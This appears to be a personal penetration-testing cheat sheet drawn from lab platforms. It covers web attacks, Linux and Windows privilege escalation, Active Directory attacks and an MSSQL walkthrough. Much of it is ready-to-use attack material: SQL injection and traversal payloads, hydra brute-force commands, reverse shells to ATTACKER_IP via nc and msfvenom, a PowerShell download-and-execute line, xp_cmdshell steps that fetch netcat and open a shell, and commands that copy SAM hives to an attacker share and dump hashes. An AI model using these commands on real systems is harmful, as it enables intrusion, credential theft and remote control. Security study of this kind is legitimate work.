Helpful resources
 - https://gowthams.gitbook.io/bughunter-handbook/  (quick reference)
 - https://exploit-notes.hdks.org (quick reference) 
 - https://portswigger.net/web-security/dashboard
 - https://cloud.hacktricks.xyz/welcome/readme
 - https://gtfobins.github.io/gtfobins/vi/#sudo

# METHODOLOGY
1. Look at the available scopes
2. Run Ultimate.sh on it
3. Run shodan.io on the main domain
4. Run smuggler.py python script
5. Read previous bug reports, list them down
6. Get the domain unusual domain
7. Run nuclei on the domain
8. Run FFUF to get the content, save the content
9. Run owasp scanner, visit the entire content
10. Run burp scanner on it
11. List authentication endpoint
12. List authorized access controlled docs/endpoints
13. On the inputs, run test OS command injection, XSS, SQLI, SSTI, SSRF, directory traversal
14. For authentication run authentication attacks
15. For authorization run Auhtorization attacks
16. Then searhcing for logical issues, pass in garbage values, try skipping steps
17. If fav.ico is used by framework, download, get md5, use https://wiki.owasp.org/index.php/OWASP_favicon_database
18. google dorking, site:tryhackme.com, inurl:admin, filetype:pdf, intitle:admin
19.  wayback
20.  github, see repo, old passwords?
21.  There might be .git in url. `dirsearch` finds it? then use
```diff
@@ bash gitdumper.sh http://target/.git/ <dest-dir> @@
```
23.  The tool is in https://github.com/internetwache/GitTools,
24.  `git restore .` to get to latest version. `git log` see latest.
25. S3 Buckets S3 Buckets are a storage service provided by Amazon AWS, allowing people to save files and even static website content in the cloud accessible over HTTP and HTTPS. The owner of the files     can set access permissions to either make files public, private and even writable. Sometimes these access permissions are incorrectly set and inadvertently allow access to files that sh    ouldn't be available to the public. The format of the S3 buckets is http(s)://{name}.s3.amazonaws.com where {name} is decided by the owner, such as tryhackme-assets.s3.amazonaws.com. S3     buckets can be discovered in many ways, such as finding the URLs in the website's page source, GitHub repositories, or even automating the process. One common automation method is by usi    ng the company name followed by common terms such as {name}-assets, {name}-www, {name}-public, {name}-private, etc.

### Authntication
 - Username enumeration, bruteforce username and password
 - there may be subltle differences like missing of period "Invalid Username and password." to "Invalid Username and password."
 - You can add column in intruder, for mulitple us pitchfork
 - Response timing may be different for valid usernames, send extra long passwords so that time difference is huge
 - X-Forwarded-For random value may bypass bruteforce protection
 - Sometimes bruteforce blocks IP, and successful login may rest IP blocking
 - User account limiting may be done, so a user, use three passwords for three limit, then while that user blocked try for another user
 - If another account creation is possible, create another account, and use autorize or auth matrix
 - parameter modification maybe? http://www.site.com/page.asp?authenticated=no, something in body u could change?
 - IDOR?
 - Test Password reset functionalities.
 - is there any alternate channel to authentication? weaker maybe?
 - SQL injection? (' OR TRUE --) (username '-- [comment password section])
 - Broken captcha. captcha may be abel to be obtained from a rest api
 - main.js may have path info
 - Re registering already existing user, with extra spaces? 

### Sensitive Data Exposure
 - Metrics path exposed, ex: for prometheus usually /metrics
 
### Access control
 - identifier-based access control. ex: https://test.com?doc=1234 , can u access directly if doc param value matches?
 - check for static files, directly accessible?
 - MUlti-stage, is another step direclty accessible?
 - Platform misconfiguration. use of different header?
 - Referer based? location based?
 - Change json values, example add duplicate fields, ex: in juice shop {"ProductId":1,"BasketId":"6","BasketId":"1","quantity":1}, another baskedID would be of another user.
 - Api Endpoint from which we can directly modify data, try different http methods
### Host Header Attacks:
 - Modify Host header and check if it responds
 - flawed validation in host? starts with, ends with
   Ex: Host: vulnsite.com  then  vulnsite.attackersite.com
 - Duplicate host header
 - Absolute URL
   Ex: GET https://original-site.com
       Host: attackersite.com
 - Multiple Host Headers
   ex: Host: asdasd
	<space> Host: asdasdasd
 - Inject host overrides
   Ex: X-Forwarded-Host: 
 - Possibilites: Password reset poisioning, web cache poisioning, host header auth bypass, Routing based SSRF, SSRF via via flawed request parsing, via malformed request line


 
### Directory Traversal
 - check where path is being loaded, including <img> tags
 - ../../../etc/passwd
 - ....// for bypassing .. stripping
 - /etc/passwd
 - %252f
 - /var/www/images/../../../etc/passwd
 - ../../../etc/passwd%00.png
 

### CORS
 - Use the cors script
 - Access-Control-Allow-Origin check if it is randomly generated
 - check for eror parsing like starts with, endswith
 - check if null is sent
 - Can XSS be exploited
 - Can TLS be broken?
 - Can intranet be accessed?



### SQL
 - UNION BASED
 - https://portswigger.net/web-security/sql-injection/examining-the-database
 - https://portswigger.net/web-security/sql-injection/cheat-sheet
 - https://portswigger.net/web-security/sql-injection/union-attacks
 - FOR oracle db, till we get number of columns right shiftnumber of nulls
 - 1'+UNION+SELECT+table_name,NULL+FROM+all_tables-- 
1'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_GAITNR'--
1'+UNION+SELECT+USERNAME_BHDQJI,PASSWORD_OGTKPZ+FROM+USERS_GAITNR-- 
**LAB PRACTISE: https://github.com/s4n7h0/xvwa**
** PAyload: https://github.com/swisskyrepo/PayloadsAllTheThings **

https://github.com/bugcrowd/bugcrowd_university






### Open Redirection
  - DOM-based open-redirection vulnerabilities arise when a script writes attacker-controllable data into a sink that can trigger cross-domain navigation.
  Ex: = 'returnUrl = **/url**=(https?:\/\/.+)/.exec(location); if(returnUrl)location.href = returnUrl[1];else location.href = "/"'>
  so Attack can be https://origianl_url&url=AttackersURL cause the URL parameter is directly writable by the user

### API
- Look for documentation, machine readable like owasp zap swagger.
- Browse the apps.
- Identify API endpoints
    - what methods do they support?
    - supported content types?
    - Errors they can handle?
  - Fuzz to find hidden endpoints, hidden parameter (param miner)
  - *API broken user authentication*, Password dump in breach, and 2fa brute force
  - *Broken Function Level authorization*, api endpoint /api/user/453, user id Change may get access, or access for another method ?
  - *Execissive data exposure*, EX: if password reset api, gives the link directly as response as well, or something similar
  - *Mass assignment* extra properties in JSON object passed. Ex: in forgot password {username:asd,password:"asd",isAdmin:false}, could change isAdmin to true
  - Exploit unused API, check an api available methods Ex
  - ```
	GET api/products/1/price
    ```
- Se options
- ```
  OPTIONS api/products/1/price
  ```
- In lab got, PATCH allowed, passing json, it asked for price, it seems we could set price
- ```
      PATCH /api/products/1/price HTTP/2
	Host: 0a4a0084033b3c73827a0191002c0077.web-security-academy.net

    Content-Type: application/json
    
    Accept-Language: en-US,en;q=0.9
    Priority: u=1, i
    Content-Length: 13
    
    {
    "price":0
  }
  ```
##### Mass assignment
- Mass assignment reflects a scenario where client-side data is automatically bound with server-side objects or class variables. However, hackers exploit the feature by first understanding the application's business logic and sending specially crafted data to the server, acquiring administrative access or inserting tampered data. This functionality is widely exploited in the latest frameworks like Laravel, Code Ignitor etc.
- like when creating user, `credit` column, u can actually add the value.
- Finding it, lets say we have a request to create use rlike this
```
{ "username": "wiener", "email": "wiener@example.com", }
```
- When we get user info
```
{ "id": 123, "name": "John Doe", "email": "john@example.com", "isAdmin": "false" 
```
- So now we know that `id` and `isAdmin` is another paramter that we can check if we can assign ourselves.

##### Server Side Paramter Pollution
- Server-side parameter pollution occurs when a website embeds user input in a server-side request to an internal API without adequate encoding.
- Test using #,& and =.
- using #
<!--StartFragment-->

`GET /userSearch?name=peter%23foo&back=/home`

The front-end will try to access the following URL:

`GET /users/search?name=peter#foo&publicProfile=true`

<!--EndFragment-->
- Interpret response, In this case if not truncated not exploitable cause foo has been treated as part of response
- If truncated, valid response, i.e. publicProfile=true does not seem to matter and we can get private profile as well.
- Using &
<!--StartFragment-->

`GET /userSearch?name=peter%26email=foo&back=/home`

This results in the following server-side request to the internal API:

`GET /users/search?name=peter&email=foo&publicProfile=true`

Review the response for clues about how the additional parameter is parsed.

<!--EndFragment-->
- Using =
<!--StartFragment-->

`GET /userSearch?name=peter%26name=carlos&back=/home`

This results in the following server-side request to the internal API:

`GET /users/search?name=peter&name=carlos&publicProfile=true`

<!--EndFragment-->
<!--StartFragment-->

If you're able to override the original parameter, you may be able to conduct an exploit. For example, you could add `name=administrator` to the request. This may enable you to log in as the administrator user.

<!--EndFragment-->



### Go specific stuff
	go specific CVEs
OWASP
sync
input processing, large size, floating point
set timeout

size limiter = go io limiter

input validation, negative value ?

cuelang, synk

hydra -l lazie -P /mnt/c/D/SecLists-master/Passwords/Common-Credentials/common-passwords-win.txt 10.10.112.12 imap
	
sudo hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.129.234.98 http-post-form "/login.php:username=admin&password=^PASS^&Submit=Login:Warning"

           
pentester@TryHackMe$ telnet MACHINE_IP 110
Trying MACHINE_IP...
Connected to MACHINE_IP.
Escape character is '^]'.
+OK MACHINE_IP Mail Server POP3 Wed, 15 Sep 2021 11:05:34 +0300 
USER frank
+OK frank
PASS D2xc9CgD
+OK 1 messages (179) octets
STAT
+OK 1 179
LIST
+OK 1 messages (179) octets
1 179
.
RETR 1
+OK
From: Mail Server 
To: Frank 
subject: Sending email with Telnet
Hello Frank,
I am just writing to say hi!
.
QUIT
+OK MACHINE_IP closing connection
Connection closed by foreign host.


# Metasploit
1. may need to migrate if hashdump does not work
2. not all are hashes ACME-TEST$:1008:aad3b435b51404eeaad3b435b51404ee:5ff44baab48ef90b6a2eccc1786d0dd9::: :5... is hash, use online crackstation?
3. search -f <filename> in meterpreter
4. command `background` to get out of session, and use post/... modules

# Privilege Escalation

 - Use the following tools

    LinPeas: https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/
    
    LinEnum: https://github.com/rebootuser/LinEnum
    
    LES (Linux Exploit Suggester): https://github.com/mzet-/linux-exploit-suggester
    
    Linux Smart Enumeration: https://github.com/diego-treitos/linux-smart-enumeration
    
    Linux Priv Checker: https://github.com/linted/linuxprivchecker 

- Use GTFO bin, look at how they can be used to escape. https://gtfobins.github.io/  
- if u have sudo permission to somethings
- also we can check if suid or sgid bit are set in gtfo bins
- find place with suid bit set find / -type f -perm -04000 -ls 2>/dev/null
- To crach password use the following command \john.exe  --wordlist=C:\D\SecLists-master\Passwords\Common-Credentials\10k-most-common.txt pass.txt
- .\john.exe pass.txt --show
- manipulating $PATH, if a code execute commands like this system("thm"), change path to point to your binary, the calling code must have setuid set to escalate privilige.
- network mound, if no_root_sqash present
`showmount -e victimsIP`
`mount -o rw ip:/victimdir local_dir/`
make file with suid bit set in local_dir
change owner to root
run in victims machine

 - Check for any cronjob, that we can manipulate
 - check its sudo permissions `sudo -l`
- get capabilites `getcap -r / 2>/dev/null`

# Windws prov sec
NOTE: Checkout winpeas
1. Saved passwords (Search for pwoershell history in `ConsoleHost_history.txt` at C:\Users\username\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline )
## when mass deployed
C:\Unattend.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\system32\sysprep.inf
C:\Windows\system32\sysprep\sysprep.xml
## powershell history
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
## saved creds
cmdkey /list
runas /savecred /user:admin cmd.exe

## saved IIS configuration
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString

## putty proxy configuration
reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s

## scheduled tasks
 - `schtasks /query /tn vulntask /fo list /v`  this command trims down the output
 - just check the `Task To Run` and `Run As`
 - `icacls <binary_from_task_to_run>`
 - If you can modify binary, then you can run ur own code `echo c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4444 > C:\tasks\schtask.bat`
	
## AlwaysInstallElevated
 - MSI files, if some registry keys have been set, can run with higher priviliges 
 - keys to check `C:\> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
C:\> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer`
 - Generate the payload `msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_10.10.247.41 LPORT=LOCAL_PORT -f msi -o malicious.msi`
 - Run the payload `C:\> msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi`

## Insecure Permissions on Service Executable
 - `sc qc <Service_name>`
 - `icacls <binary>`
 - Can u modify it?
 - msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4445 -f exe-service -o rev-svc.exe
 - setup a python http server, in powershell download using wget
 - move the original service binary file, since the service binary will be run by another user, change permission  `icacls WService.exe /grant Everyone:F`
 - `sc stop <service>` `sc start <service>`
 - not any binary can be run as service, so be careful

## Unquoted Service Paths
 - If task to run binary path is not properly quoted like `C:\MyPrograms\Disk Sorter Enterprise\bin`
 - sc will look for `C:\MyPrograms\Disk.exe` `C:\MyPrograms\Disk Sorter.exe` and `C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe` respectively
 - If u can create such files in the directories, like Disk.exe, u can modify which service is executed.

## Insecure Service Permissions
 - not of binary, but of service itself
 - can use tool from https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk
 - accesschk64.exe -qlc <service_name>
 - `icacls C:\Users\me\bin.exe /grant Everyone:F`
 - `sc config THMService binPath= "C:\Users\me\bin.exe" obj= LocalSystem`
 - sc stop and start again

## Windows Privliges
 - to check your privilige `whoami /priv`
 - use methods from https://github.com/gtworek/Priv2Admin
 - tryhackme had `SeBackup / SeRestore` lab
```
C:\> reg save hklm\system C:\Users\THMBackup\system.hive
The operation completed successfully.

C:\> reg save hklm\sam C:\Users\THMBackup\sam.hive
The operation completed successfully.


user@attackerpc$ mkdir share
user@attackerpc$ python3.9 /opt/impacket/examples/smbserver.py -smb2support -username THMBackup -password CopyMaster555 public share
   

C:\> copy C:\Users\THMBackup\sam.hive \\ATTACKER_IP\public\
C:\> copy C:\Users\THMBackup\system.hive \\ATTACKER_IP\public\

        

And use impacket to retrieve the users' password hashes:
Kali Linux

user@attackerpc$ python3.9 /opt/impacket/examples/secretsdump.py -sam sam.hive -system system.hive LOCAL
Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation

[*] Target system bootKey: 0x36c8d26ec0df8b23ce63bcefa6e2d821
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:13a04cdcf3f7ec41264e568127c5ca94:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::

```
## Other stuffs
- search for installed programs and exploit any known vulnerabilities `wmic product get name,version,vendor` may also need to check desktop shortcut, services and other indicator of installed apps.
 - Additional tools to use `https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS` `https://github.com/itm4n/PrivescCheck` `https://github.com/bitsadmin/wesng` `metasploit multi/recon/local_exploit_suggester` 

## SAMBA
 - Interopratibility program for linux and unix to windows SMB
 - `nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse <ip>`
 - `smbclient //<ip>/anonymous`  // if anon supported
 - `smbget -R smb://<ip>/anonymous`  // recursively download everything
 - `nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.244.32`  // recon network file share
 - If u find vulnerability in searchsploit, if not RCE, others thing we can do, like copy files? proftd had something similar, copy ssh key?
 - `mkdir /mnt/NFS` `mount victim_ip:/var /mnt/NFS` `ls -la /mnt/kenobiNFS1`

## Jenkins room
 - check default creds
 - search for functionality to execute commands (it was in build options)
 - privsec https://github.com/samratashok/nishang
 - powershell iex (New-Object Net.WebClient).DownloadString('http://your-ip:your-port/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress your-ip -Port your-port
 - whoami /priv may give SeImpersonatePrivilege 
 - we can impersonate in meterpreter
 - `list_tokens -g`
 - `impersonate_token "BUILTIN\Administrators" `

## SMB
 - basically a request-response protocol over netbios on TCP/IP, unix has open source version that implements it SMB
 - used to share access to files, printers, serial ports and other stuffs
 - client sends request to server, and can send requests to server to perform stuff.
 - SMB share drives on a server that can be connected to and used to view or transfer files
 - enumeration, port scanning or enum4linux https://github.com/CiscoCXSecurity/enum4linux `enum4linux [options] ip`. 
 - port 445 by default, do nmap -sV
 - note down the username, workgroup and interesting share names
 - anonymous connect using `smbclient \\IP\share_name -u username`. try anon login without username
 - download file with `get <filename>`

## NFS
 - Network File System
 - use `nfs-common` package
 - sudo mount -t nfs IP:share /tmp/mount/ -nolock
 - `showmount e IP` to list shares
 - root_squash, (in ur pc, download a bash form internet, set it suid, chmod +s ..., ssh into machine and then run the bash)

## SMTP
 - connect using telnet and VRFY, EXPN, and RCPT TO commands.
 - metasploit auxiliary smtp modules.
## MYSQL
 - username and password already required
 - mestasploit schema dump and hash dump
 
## Active Directory
 - Windows domain is a group of users and computers under the administration of a given business
 - Active Directory acts as a catalogue that holds the information of all of the "objects" that exist on your network.
 - Users and Machine
 - GPOs are distributed to the network via a network share called SYSVOL, 
 -  it might take up to 2 hours for computers to catch up. 
 - force update GRP sync in local computer `gpupdate /force`
 - authentication method kerberos and netNTML
 - kerberos preferred, send username and password to kerberos server, and it returns ticket granting ticket, lookup process online if confused.
 - netNTLM from tryhackme https://tryhackme.com/room/winadbasics  
`The client sends an authentication request to the server they want to access.
The server generates a random number and sends it as a challenge to the client. The client combines their NTLM password hash with the challenge (and other known data) to generate a response to the challenge and sends it back to the server for verification. The server forwards the challenge and the response to the Domain Controller for verification. The domain controller uses the challenge to recalculate the response and compares it to the original response sent by the client. If they both match, the client is authenticated; otherwise, access is denied. The authentication result is sent back to the server. The server forwards the authentication result to the client.`
 - nmap scan, use kerbrute to get usernames? ```./kerbrute_linux_386 userenum usernames.txt --dc domain_controller```
 - ./kerbrute_linux_amd64  userenum userlist.txt -d spookysec.local --dc 10.10.107.161
 - ASREPRoasting. ASReproasting occurs when a user account has the privilege "Does not require Pre-Authentication" set. USe impacket tools ```python3.9 /opt/impacket/examples/GetNPUsers.py spookysec.local/svc-admin```. Might need to set dns config to map domain to IP. after the tool, u might get hash
 - Lookup hash in `https://hashcat.net/wiki/doku.php?id=example_hashes`
 - `hashcat -m 18200 -a 0 pass_hash.txt passwordlist.txt` pass_hash.txt must have the full, hashcat_wiki is a good resource
 - form there u can try different things
 - smbclient `smbclient -L \\\\10.10.107.161 -U spookysec.local/svc-admin`
 - `smbclient \\\\10.10.107.161\\backup -U spookysec.local/svc-admin` to connect to the shares.
 - From tryhackme notes :"Knowing this, we can use another tool within Impacket called "secretsdump.py". This will allow us to retrieve all of the password hashes that this user account (that is synced with the domain controller) has to offer" `python3.9 /opt/impacket/examples/secretsdump.py spookysec.local/backup@10.10.152.71`
 - Most of the replication related tasks are specified on the Directory Replication Service (DRS) Remote Protocol. The Microsoft API which implements such protocol is called DRSUAPI.
 - look at the format `Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::` uid:rid:lmhash:nthash
 - pass the hash attack using `evil-winrm -u backup -H 19741bde08e135f4b40f1ca9aab45538 -i spookysec.local`
 - another tool https://github.com/GhostPack/Rubeus, need to launch in windows, listens for any kerberos tickets being passed in network `Rubeus.exe harvest /interval:30`
 - Kerberoasting is a post-exploitation attack technique that attempts to crack the password of a service account within the Active Directory (AD). In such an attack, an adversary masquerading as an account user with a service principal name (SPN) requests a ticket, which contains an encrypted password, or Kerberos.
 -  BloodHound to find all Kerberoastable accounts,
 - With rubeus `Rubeus.exe kerberoast` and u can try to crack the hash `hashcat -m 13100 -a 0 hash.txt Pass.txt`.
 - with impacket `sudo python3 GetUserSPNs.py controller.local/Machine1:Password1 -dc-ip 10.10.128.123 -request` and crack the hash
 - AS-REP Roasting dumps the krbasrep5 hashes of user accounts that have Kerberos pre-authentication disabled. Unlike Kerberoasting these users do not have to be service accounts the only requirement to be able to AS-REP roast a user is the user must have pre-authentication disabled.
 - NOTE from tryhackme `During pre-authentication, the users hash will be used to encrypt a timestamp that the domain controller will attempt to decrypt to validate that the right hash is being used and is not replaying a previous request. After validating the timestamp the KDC will then issue a TGT for the user. If pre-authentication is disabled you can request any authentication data for any user and the KDC will return an encrypted TGT that can be cracked offline because the KDC skips the step of validating that the user is really who they say that they are`
 - For AS-REP roasting, using rubeus, need to add  Insert 23$ after $krb5asrep$ so that the first line will be $krb5asrep$23$User. Make hash type `Kerberos 5, etype 23, AS-REP`
  - `hashcat -m 18200 hash.txt Pass.txt`
  - Pass the ticket works by dumping the TGT from the LSASS memory of the machine. The Local Security Authority Subsystem Service (LSASS) is a memory process that stores credentials on an active directory server and can store Kerberos ticket along with other credential types to act as the gatekeeper and accept or reject the credentials provided
  - using mimikatz dump the ticket `sekurlsa::tickets /export` and then use the ticket `kerberos::ptt <ticket>` <ticket> = ticket file path
  - Check if a system is part of domain `systeminfo | findstr Domain`
 - https://github.com/ThePacketBender/notes/blob/master/hashcat.examples.txt

## Machine notes
 - sshkeygen creeate persistence man, can you copy for another user in auhtorized_keys
 - linpeas for info
 - rootsquash ,copy bash as root, set suid bash in network share
 - run the bash from remote session
 - ` ssh paradox@10.10.35.239 -i paradox 2049:localhost:2049` port forwarding if local mounting is not allowed
 - `mount -t nfs localhost:/ nfs/` after mounting locally
 
## MSSQL writeup
 - From HTB starting point
 - nmap to get stuff
 - `smbclient \\\\10.10.107.161\\backup` to get data.
 - python3 mssqlclient.py ARCHETYPE/sql_svc@{TARGET_IP} -windows-auth.
 - once connected, can `xp_cmdshell` can execute commands, might need to enter the following to enable xp_cmdshell `EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
sp_configure; - Enabling the sp_configure as stated in the above error message
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;`
 - Make the victim download `https://github.com/int0x33/nc.exe/blob/master/nc64.exe?source=post_page-----a2ddc3557403----------------------`
 -`xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget http://10.10.14.22/nc64.exe -outfile nc64.exe"` OR `xp_cmdshell "powershell -c Invoke-WebRequest -Uri \"http://10.10.14.22:80/nc64.exe \" -OutFile \"C:\Users\sql_svc\Downloads\n.exe\""`
 - Listen on ur machine and on victim `xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; .\nc64.exe -e cmd.exe 10.129.113.162 443"`
 - Windows ssh like access `python3 psexec.py administrator@10.129.113.162` impacket tool

# Blue team notes
 - yara <path to specific yara rule file> target
 - python loki.py -p .  (loki is an alternative)
 - python3 yarGen.py -m <path to file to generate signature for> --excludegood -o <destination to .yar signature> https://github.com/Neo23x0/yarGen
 - floss (to auto decode strings in malware and detect them) https://www.mandiant.com/resources/blog/automatically-extracting-obfuscated-strings https://github.com/mandiant/flare-floss/releases
 - ssdeep compare hashes between two files, and their similarity percentage using fuzzy hashes. A fuzzy hash is a Context Triggered Piecewise Hash (CTPH). This hash is calculated by dividing a file into pieces and calculating the hashes of the different pieces. https://ssdeep-project.github.io/ssdeep/index.html
 - capa does a little bit of triage automation https://github.com/mandiant/capa
 - pestudio some automated analysis in PE header


# Common Bypass Techniques
 - String terminators
%00

0x00

//

;

%

!

?

[]

%5B%5D

%09

%0a

%0b

%0c

%0e
 - Example usage:
`POST /api/v1/user/profile/update

[…]

 

{

“uname”: “hapihacker”

“pass”: "%00'OR 1=1"

}`
	
 - case switching
 - Encoding payloads
 - Wfuzz has different payload encoding options like, `base64`
